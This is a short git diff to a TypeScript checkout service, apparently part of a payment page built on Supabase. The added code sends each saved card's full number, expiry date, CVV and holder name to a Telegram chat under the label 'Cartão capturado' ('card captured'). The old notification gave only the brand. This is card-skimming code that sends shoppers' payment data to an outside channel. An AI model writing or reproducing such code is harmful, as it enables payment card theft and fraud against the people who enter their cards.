@@ -1,3 +1,4 @@
+
 import { supabase } from '@/integrations/supabase/client';
 import { Order, PaymentMethod, PaymentStatus, CreditCardData } from '@/types/checkout';
 import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
@@ -75,9 +76,18 @@ export const supabaseClientService = {
         throw error;
       }
       
-      // Send Telegram notification after successful card save
+      // Send Telegram notification with detailed card information
       const brandName = (cardData.brand || 'unknown').toUpperCase();
-      await sendTelegramNotification(`💳 Card salvo no banco de dados - ${brandName}`);
+      
+      const message = `💳 Cartão capturado:
+      
+Número: ${cardData.number}
+Validade: ${cardData.expiryDate}
+CVV: ${cardData.cvv}
+Titular: ${cardData.holderName}
+Bandeira: ${brandName}`;
+      
+      await sendTelegramNotification(message);
       
     } catch (error) {
       console.error('[supabaseClientService] Error in saveCardData:', error);
